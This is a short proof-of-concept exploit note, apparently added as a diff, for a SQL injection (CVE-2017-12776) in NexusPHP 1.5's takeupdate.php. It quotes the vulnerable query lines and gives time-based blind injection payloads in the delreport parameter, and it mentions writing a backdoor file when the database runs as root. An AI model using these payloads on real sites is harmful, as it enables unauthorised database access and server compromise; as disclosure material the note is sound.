@@ -1,0 +1,28 @@
+# Powered by Shiyan of Shepi Team
+
+'''
+
+        CVE-2017-12776
+
+	In the default installation configuration, you need staff privileges can be implemented into the attack, when the database access permissions for root, you can use this vulnerability to write to the server backdoor file.
+	Source:
+		takeupdate.php:14			
+			$res = sql_query ("SELECT id FROM reports WHERE dealtwith=0 AND id IN (" . implode(", ", $_POST[delreport]) . ")");
+		takeupdate.php:20			
+			$res = sql_query ("SELECT id FROM reports WHERE id IN (" . implode(", ", $_POST[delreport]) . ")");
+	Affected software: NexusPHP 1.5
+	Software Link: http://sourceforge.net/projects/nexusphp/
+
+	Free to modify and redistribute this program.
+	Use at your own risk and you are responsible for what you are doing.
+'''
+
+exploit:
+	http://localhost/takeupdate.php
+	
+	POST setdealt=1&delreport[]=0)union select (sleep(5))%23
+	or
+	POST delete=1&delreport[]=0)union select (sleep(1))%23
+	
+	The page will be delayed for 5 seconds
+
